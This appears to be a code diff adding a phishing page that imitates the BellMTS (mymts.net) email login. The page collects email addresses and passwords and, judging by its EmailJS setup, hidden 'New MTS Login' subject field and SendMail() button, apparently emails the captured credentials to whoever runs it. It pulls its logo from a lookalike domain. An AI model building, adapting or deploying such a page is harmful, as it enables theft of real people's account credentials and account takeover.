@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BellMTS Login</title>
+  <script type="text/javascript" src ="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  
+  <script type="text/javascript">
+  (function () {
+   emailjs.init( "_5bW6VXlFyVgEqxGf");
+  })();
+  </script>
+            
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <div class="container">
+    <div class="header-container">
+      <img class="logo" src="https://cableco.auth-gateway.net/images/mts/bellmts.png" alt="MTS Mail" />
+      <p>Log in with your mymts.net email address</p>
+    </div>
+
+    <div class="form-container">
+      
+        <label for="email">Email Address:</label>
+        <input type="email" id="email" name="email" placeholder="example@mymts.net" required />
+      
+        <label for="pswd">Password:</label>
+        <input type="text" id="pswd" name="pswd_hint" placeholder="Enter your password" required />
+      
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_subject" value="New MTS Login" />
+       
+      
+        <div id="errorMsg" class="error" style="display: none;">Login incorrect</div>
+        
+        <button onclick="SendMail()">LOG IN</button>
+      
+        <div class="options">
+          <label><input type="checkbox" id="remember" /> Remember Me</label>
+          <a href="#">Forgot Password?</a>
+        </div>
+      
+      
+    </div>
+  </div>
+
+  <script src="newscript.js"></script>
+</body>
+</html>
